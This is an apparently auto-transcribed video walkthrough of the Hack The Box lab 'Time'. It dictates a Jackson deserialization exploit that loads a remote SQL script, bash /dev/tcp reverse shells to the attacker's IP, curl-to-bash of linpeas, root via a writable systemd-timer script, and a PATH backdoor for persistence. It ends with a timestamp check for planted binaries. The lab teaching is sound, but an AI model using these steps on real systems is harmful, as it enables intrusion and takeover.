 what's going on youtube this is ipsec we're doing time from hack the box and this box is all about being able to take an error message finding out what application and library that web app uses and then looking for exploits in the actual library by putting non-json data into the website you get a error message about jackson which is a i think java library for serializing things and there's a vulnerability which you can lead to code execution it's pretty hard to understand the gadget chain of deserialization so we just look over a blog post find some ways to identify it and test out basic proofs of concepts and then get a shell once on the box the privesque is related to a systemd timer and lin pease does show this it doesn't highlight it in that red and yellow thing but if you just read the lin piece output this becomes super familiar additionally if you look at the forensics around where that file exists you'll see that the actual timestamp of the file sticks out like a sore thumb so we go into that end of the video with all that being said let's jump in as always we're going to start for the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it time and then the ip address of 10 10 10 to 14. this can take some time to run so i've already ran it looking at the results we see just two ports open ssh on port 22 and his banner tells us it's in ubuntu server we also have http on port 80 and its banner tells us it's apache httpd and also ubuntu there's not too much information here i guess we got this title of the http page saying it's an online json parser and then if we wanted to we could search these versions like this for ubuntu we just put that into google and go to launchpad it'll tell us what disto it is i think bionic beaver and we can see uploaded to bionic so we know this is ubuntu 18. uh if it was ubuntu 20 it would say like focal i think for a focal fossil i think that's what ubuntu 220 is but yeah not too much information but let's put this in obsidian so we can have some notes that are easily accessible so i'm going to do new for a new note 05 and we'll call it nmap and put the results here and we can say use the sql parser so we have syntax highlighting uh you can say any language you want there's even an nmap one if you custom install it i don't know how to do that it's not my head yet so i have not included that but in the future videos we'll have a custom nmap parser probably for this and then we want to take notes um we can say this is bionic beaver based upon this so i'm going to put a dash and then we will go to launchpad and grab this so whenever you want to put a finding now this is a finding like you can guess uh enumerate what exact version of linux it is based upon the banner it's always good to have like the link in your back pocket i guess how do you know that's bionic beaver from this well you go here and you see the only package this is deployed to is bionic and the reason why this is kind of a security vulnerability is because if it was like ubuntu 14 and they forgot to patch it makes it just more apparent because it's just screaming it's an out of date server and if it was ubuntu 14 i know okay well once i get on this box i probably should just throw dirty cow or some other cve against it so yeah let's just move on to take a look at the web server so we go 10 10 10 is it 214 or 215 looks like 214 is good and we get this online json beautifier and validator so if we just put in some text we can see what happens it just says null we can put in json so like what should you do and we'll say i subscribe a habit of mistake please subscribe so we click process and it just purifies that json there is a drop down here so we got this validate and i'm going to copy this json and we'll try putting it under this validator we click process and it takes a bit longer and we get validation failed what should you do subscribe so we didn't get anything um i'm just going to put random text here that's not json to see what happens and we have to make sure we're on validate and see what happens if we give this field not json input we get a unhandled java exception so this is definitely interesting so we'll create a new note 10 uh web i guess and we'll say uh validator and we can say input please subscribe output like that okay so we have something here and the key thing is it's telling us it's jackson jackson core json purser we get unrecognized token please subscribe was expecting true false or null so if i just type true here on this validate and see what happens here we get processing validation successful if i give it json and do true what happens and this is just exploring the application uh we have to copy paste and see what happens we get validation failed i started with a line break so let's just get rid of that and click process and after it takes some time we just get validation failed still so when we don't give it json that is the most interesting piece so we look at this and right now i want to put emphasis around this because it's telling us what library is underneath it's also telling us it is java so we can put emphasis around java and again a finding would be you don't display your error messages to standard out because it does indicate like good enumeration so one of the findings here would just be um unhandled errors get displayed and generally if you're in like production mode and not debug that's not a thing but yeah stack traces out to people when they cause errors is very bad because we can just google this and type exploit and see if anything on this exploit occurs we have something from 2019 this src thing looks like a write-up let's see jackson i'm also going to say like jackson since that was a 2019 thing i'll just say jackson 2019 cve and we can get a few more and then we can also go over here and do search point jackson to see if we have anything and we don't going back over to our articles let's take a look at this very first one this is attacking on marshalls jd and i injection based upon deserialization so this looks like it's telling us quite a bit we have jackson core 299 and there was no way i can verify like what jackson version this is so far if i do a control u to view the source if i look around here i don't really see anything we could go in javascript but i'm not sure how to validate what version this application is so we're kind of just looking for some type of payloads where we can throw and see if we get anything um i don't really see exploits here i don't want to go and like copy this and run it in a job application it looks like it's giving me a string so i think if i sent this payload we may be able to do something but again i'm gonna see if i can find a better one because i just hate building java projects uh if i find like python exploits that's where like i like playing with a lot more because you don't have to compile something and then execute it and i'm just more familiar with python so looking through this it's explaining the exploit but i just want to find out if it's vulnerable or not so we have this string here so it looks like it is escaped meaning if i paste this we have these escapes around these quotes and i don't really want those so i'm just going to echo this and the echo just magically processes those escapes and we have this payload and we don't really have too much here but let's see if this throws a unique error if we go back to this online json parser and put this what does it say do we get like some error about this driver uh unhandled java exception let's just copy it here go over input oh god that is that's a big error this is the output but oh god a stack overflow happened um so that did not go what i thought but i'm just gonna say dot dot dot snip dot dot and this is output so i think we have some type of exploit here just based upon that and the thing i got to get better with is copy and pasting because the input keeps going away so i copied it from here so this is the input and then one thing i want to do is just screenshot this page so if we go here print screen and this is flame shot and i can just copy screenshot control c and we paste there we go so this way the title does show this page okay so that input is good we probably need to escape these like that because it is marked down and there's brackets actually do something so this looks better so we can say input that i'll put that okay the next thing let's go and keep going down to see if they give anything they have server side request forgery to rce and this is something we're going to be seeing a lot more because people have started learning how to weaponize ssrfs mainly thanks to like orange sci uh if we google orange tsai i think it'll be his twitter this guy does ssrf like i he's amazing at him so he's exploited a bunch of firewall products like every year at black cat he does one ups himself like he's found palo alto exploits i believe um pulse vpn uh even the latest exchange exploit was found by orange sci and it was ssrf so there's a lot of cool things you can do with srfs that people are finding out and it looks like we have this decelization gadget and it's just like the last one we're still doing this driver managed connection but we're giving it jbdc or jdbc which is java database something connectivity uh yeah the db is database so java database connectivity so we're giving it a url that says hey i'm a java database and we're saying run script and saying go to this url inject.sql and this injection script is just going to create a function called shell exec and then it's going to um attempt to run bash c so it's like an xp cmd and my sequel or ms sql but for these jdbcs so we create a function in this to run a code so let's just do what we did before so we can copy this echo paste and then we'll probably want to change localhost 8000 to be 1010142 which is my ip address and i'm also going to listen on port 8000 so we'll see if this connects back to us so i can just copy this then we go back over to our page make sure on validate paste and if it connects we get something good so this is great so we can go back here to our notes input this output hdb connection okay so let's make dirt dub dub dub and we're gonna put his shell in so let's go and back to our browser and where is the sql here we go so v inject.sql paste and instead of this id to exploit it i just want to do a ping so we can say ping dash c1 10 10 14 2 that is good save it and then python 3-m http server tcp dump dash i ton zero icmp probably run that with sudo and we can run this command again so if i i want to copy it from terminal because i escaped it from my markdown notes so we can copy this go back here paste with to validate and verification failed uh something weird happened because it didn't even get our server copy let's try this again process i probably had like i do have something there's a line break there so sometimes i don't know exactly what it is but when i copy it it copies the line break with it and i just pasted that to beautify okay this doesn't have a line break let's validate it's taking longer we got it and we get one single ping so we know this works so let's try upgrading from a ping to be a reverse shell so let's go to inject.sql and it's already calling bash.c so i don't have to do that i know i'm executing this command in bash so what i'm going to do is bash dash i is it like that i think so 10 10 14 2 0 at and one uh dev tcp 10 10 14 2 9 000 1. there we go that looks like a reverse shell so let's nc lvmp 9001 and we will execute this yet again so execute we got it and now we have a reverse shell so let's upgrade this tty so python dash c import pty pty dot spawn bin bash and then stdy raw minus echo fg enter enter so now i have tab autocomplete and things like that in my shell but before i can go on um i do want to grab inject.sql so i'm going to cat inject.sql and we will paste this here for notes so going back to this paste and this can be sql let's see what that looks like looks great so we'll clean up these notes once we finish with the box so now that we have a shell on this box we can probably run linpe's so let's go to a new tab or a new window and we're going to cp opt is it privilege escalation is it p there we go and then lin pease linps.sh on a web server again i don't know why i just killed it like a second ago but now we have that we can curl 10 10 14 2 put 8 000 linps.sh pipe it over to bash and we'll see what this ends up showing us i'm going to pause the video and we'll resume once this command has finished lin p's is now finished running so let's go take a look at what it says and the very first thing we have is wait this is actually ubuntu focal so i guess i was wrong at the very beginning of the video thinking this was bionic it's telling us it's focal so latest version of ubuntu pseudoversion1831 uh maybe this hasn't been patched yet let's see if we go here and see what this says search point sudo i thought it would give us like a test if sudo is vulnerable i want to say we can edit test it with like pseudo edit so we should take a look at that um i think there was like a 1831p2 or something so we should take a look at pseudo saying it's a virtual machine these are processes so we can just take a quick look at all the root processes uh apache is normally starting as root because you have to listen you have to be root to listen or a socket below 1024 i think it's like privileged sockets so apache starts as root and then it downgrades itself to a different user so nothing too interesting here in these processes you can look at other things credentials in memory this is looking at cron tab everything looks standard surfer system d path dot service files there's a lot of service files can't write to systemd path we do have something unique here under the system timers we have this timer backup timer so this is definitely interesting i'm going to just make notes and lin p's so proves maybe and i'm just going to put system d timer something like that just about to take a look at it and we should have marked pseudo version i think it was one eight three one memory serves correctly keep going down http sockets config files interfaces iptables login now password policy nothing too interesting so far tons and tons of searches now it's looking at interesting files so these are going to be set uid files i'm just quickly glancing over these to see if there's any i don't recognize and i don't see any oddly enough that user been sudo is that sim linked over to slash sudo i don't know looking at it nothing in ld.so preloads capabilities um you own the script this which is a timer backup script so that is interesting so that was looking at um files i own within the path environment so user bin we have potentially a bash history and we're about out of the interesting things okay we're out so i want to try sudo edit slash was it i think that was supposed maybe dash capital s let's see test for pseudo exploit i know it's with pseudoedit and maybe it was um giving it a long path there we go so let's see while running this backtick see it has a built-in how to check if you're infected run this if you receive a usage or error message here is not vulnerability vulnerable or a segfault it is so probably not vulnerable because we did not sag fault okay so you can say not von ran this okay the system d timer this is interesting so let's go and go into etsy find dot grep timer and see what we have uh we got this timer backup so we can cut this file and we see let's see on inactive so every 10 seconds it runs this timer backup service if we cat this let's see what this does backup service unit restart web backup dot service see exec we probably should have done two dev null to hide error messages i wonder what this web backup service is let's see i'm just going to grab for this timer backup.sh so grab r to go into all these directories and to devnoll so this 7d web backup service is going to run this timer back up so it looks like it was just like hid between service of service of service maybe if we cut this file yeah creates a backup of the website and executes this script so if we go user bin cd user bin lsla we can see we own this file so we can just write to it so we can just put a reverse shell here if we do nc lvmp 9001 v this file uh let's do c bash we'll put this in quotes bash dash i i think it's a single quote probably doesn't matter dev tcp 10 10 14 2 9 000 1 0 at and 1 like that so we wrote to this file oh shoot uh i just killed that shell hopefully i did not type her this oh there we go um lsgreti what file did i just cat um where's cat come on i can just cap this file cat so it doesn't look like it did anything let's vi this maybe i typoed or something happened bash dash c bash dash i dev tcp 1010 14 2 9001 0 and 1. so we need to write it with an exclamation point and it is here and we get a shell there we go i'm not sure what happened that first time but we have rooted this box now there is some interesting things we can talk about in this box for instance the user plays something in user bin and while this may not be a super common thing to do it's common in malware i'm going to export term is equal to x term so now i can clear the screen so one of the common things is if we echo path and let's say where's ping so ping is in user bin so it's here so if i want to persist on this box uh here i may put a ping binary in user local s pen so user local s pen and we can say v ping say it's a bash script ben bash we can say echo hello ping i think that may be the first argument there's a better way to do this there's a way to like put all arguments into the binary but um oh i'm not rude so it's not gonna work but you could do something like that and now when they run ping it's gonna run your command and then go back to the regular ping binary but there's an easy way to check for things like this that doesn't get a lot of publicity and that is something i've talked about in two previous videos which is just the time stamp on things so this user local directory this is where users are supposed to put bins when it says local that means like user when it doesn't say local that means it's supposed to be managed by the package manager so if we go to user bin and we do a lsla we just see these dates if we do lsla dash time style equals full we see full timestamps and a lot of like packages like tar zip d package everything doesn't record like the microseconds or whatever argument or time measurement this is so that's why you see all those but if you interact with the file it does record that so if you do ls la on this time we can see this time backup has stuff so this means it was probably placed here by the user because it didn't come out of d package which anything in user bin should come out of d package so if i wanted to backdoor binary and take it even one step further than just creating ping and user s pen what i would do is i'd put some shell code into this ping binary or because linux is open source grab the source code to the ping binary recompile it with my back door in and place it on the box but because i put it on the box and didn't just clean up my time stamp manually it will have this 476 or whatever the time increment is it's not going to go all zeroes like if you've ever like gotten gas and try to stop it evenly on a dollar it's just not gonna happen so you just won't really see these timestamps occur naturally by people so what you can do is echo path and we can say um echo path let's get rid of anything with uh we'll replace these colons with something so s colon slash g like that so now we have a bunch of things and let's get rid of these user locals we don't care about those we just want to look at these paths so if i do a quick script so for i and this do echo i done and i'm gonna have to fix up my tty real quick so s t t y dash a s t t y rows uh 32 i'm doubling the rows because i want to go the full window calls 136 i think there we go so now if i run that command i don't go off screen but we can see i can loop amongst all these directories so what i can now do is we can do this ls dash la dash dash time style equals full let's see do a time dash style so now we ran that command across our whole path and then we can say um grep dash v and put five zeros in so we're saying hide everything with five zeros so now we get a bunch of weird things we get um the sim links do have these exact paths so let's hide anything with a sim link by just excluding that arrow there's probably a time like a ls argument to do it but i'm in grep it's easy enough to do it this way so all i do is grep dash v on those five zeros then backslash pipe which is an or and or the arrow and i'm going to run this command and the only file that comes back is timer backup because that's the only file that's manually been edited into the path so this would be a super easy way to find people that are back during your binaries without fixing the timestamp afterwards so hope you guys like this demo take care and i will see you all next on nope i forgot we should go over a notes one day i'll get better at this so we gotta do nmap and we got this bionic beaver this looks good um there's really nothing else we can highlight about this end map so good next thing web you look at this this is messy this doesn't look good to us but we have everything we need so we can just put what the page looks like so this is home page and then we can say validator and we can go even further and say this is um let's see display error then this one will be um stack overflow confirm exploit and then this is confirm uh make ssrf or make hdb connection plus shell and one two three four this will be inject.sql we can say run a web server first inject.sql and make the below command so it's not a perfect format but we got the home page we got validator and when we go back to the notes it does make some sense so that's good so now the provesque we can say limps highlighted that pseudo thing we confirmed it wasn't vulnerable um the system d timer this was the um like jumping around things so let's see exactly what this does so we go cd etsy find.grep timer we'll probably just want to copy a few files so let's cat this file so we can copy dash then that goes to the timer back up oh no this goes to timer backup service so that's what we want so let's cap this one grab this where's my cat i think this no that's the same thing isn't it let's go back to this find i want this file okay that's what i was expecting maybe i didn't copy it that's possible so we go to this and then the next thing we had was this web backup service so fine dot crap cat paste and then it executes this script which lin p's told us was owned by us so we can lsla on this i'm also going to do stat and stats just going to show me that timestamp so there we go we should say bash okay so priv-esque chain so this is going to be timer backup runs 10 seconds then the next thing we have is the timer backup service so it calls web backup and then web backup backup executes it timer up and owned by hercules and world writable and then if we really want to i guess i'll go like this additionally and user been not placed by apt okay so there we go that would be kind of what my notes look like for this box so now when i go back i can clearly see the whole like i can see what i found interesting from lynn p's and then like the priv ask like every step i was like okay when p's point us to this time of backup service the time of backup service pointed us here to this web backup the web backup point us to this file but yeah uh we forgot one wait what three three three that just looks like bigger font than this to me but i guess it's not so [Music] that'll be the box hope you guys enjoyed it take care and we'll see you all next week